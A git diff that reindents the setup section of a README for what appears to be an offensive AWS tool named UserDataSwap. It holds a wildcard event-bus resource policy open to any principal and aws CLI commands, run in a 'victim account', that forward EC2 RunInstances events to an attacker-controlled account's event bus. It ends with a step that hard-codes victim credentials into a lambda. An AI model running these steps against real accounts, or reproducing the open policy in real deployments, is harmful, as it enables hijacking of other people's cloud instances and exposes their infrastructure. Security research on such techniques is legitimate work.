@@ -19,51 +19,49 @@ There is a fair amount of permissions required to deploy this, which is ok if yo
   * In the UserDataSwap lambda account create a new event bus named `run-instance-trigger` and give it the following resource policy.
   WARNING: This will allow any AWS account to run any action against this event bus.
   TODO: Figure out the exact permissions needed for this.
-  ```
-  {
-    "Version": "2012-10-17",
-    "Statement": [{
-      "Sid": "allow_account_to_put_events",
-      "Effect": "Allow",
-      "Principal": "*",
-      "Action": "*",
-      "Resource": "<this event bus arn>"
-    }]
-  }
-  ```
-
-  * Set up a rule to trigger the UserDataSwap function with the following event config.
-
-  ```
-  {
-    "source": [
-      "aws.ec2"
-    ],
-    "detail": {
-      "eventSource": [
-        "ec2.amazonaws.com"
-      ],
-      "eventName": [
-        "RunInstances"
-      ]
+    ```
+    {
+      "Version": "2012-10-17",
+      "Statement": [{
+        "Sid": "allow_account_to_put_events",
+        "Effect": "Allow",
+        "Principal": "*",
+        "Action": "*",
+        "Resource": "<this event bus arn>"
+      }]
     }
-  }
-  ```
+    ```
+  * Set up a rule to trigger the UserDataSwap function with the following event config.
+    ```
+    {
+      "source": [
+        "aws.ec2"
+      ],
+      "detail": {
+        "eventSource": [
+          "ec2.amazonaws.com"
+        ],
+        "eventName": [
+          "RunInstances"
+        ]
+      }
+    }
+    ```
 * In the victim account:
   * Create the run-instances event trigger:
-  ```
-  aws --profile victim-account events put-rule --name run-instance-trigger --state ENABLED --event-bus-name default --event-pattern '{
-    "source": ["aws.ec2"],
-    "detail": {      
-      "eventSource": ["ec2.amazonaws.com"],
-      "eventName": ["RunInstances"]
-    }
-  }'
-  ```
+    ```
+    aws --profile victim-account events put-rule --name run-instance-trigger --state ENABLED --event-bus-name default --event-pattern '{
+      "source": ["aws.ec2"],
+      "detail": {      
+        "eventSource": ["ec2.amazonaws.com"],
+        "eventName": ["RunInstances"]
+      }
+    }'
+    ```
   * Add a target to forward to the event-bus in the UserDataSwap account:
-  ```
-  aws events put-targets --rule run-instance-trigger --event-bus-name default --targets "Id"="1","Arn"="arn:aws:events:<region>:<attacker account #>:event-bus/run-instance-trigger"
-  ```
+    ```
+    aws events put-targets --rule run-instance-trigger --event-bus-name default --targets "Id"="1","Arn"="arn:aws:events:<region>:<attacker account #>:event-bus/run-instance-trigger"
+    ```
 * You should see the UserDataSwap triggered when a instance is created in the victim account now.
   * Update the lambda to hard code the credentials needed to make EC2 related calls in the vicitims account and deploy.
 
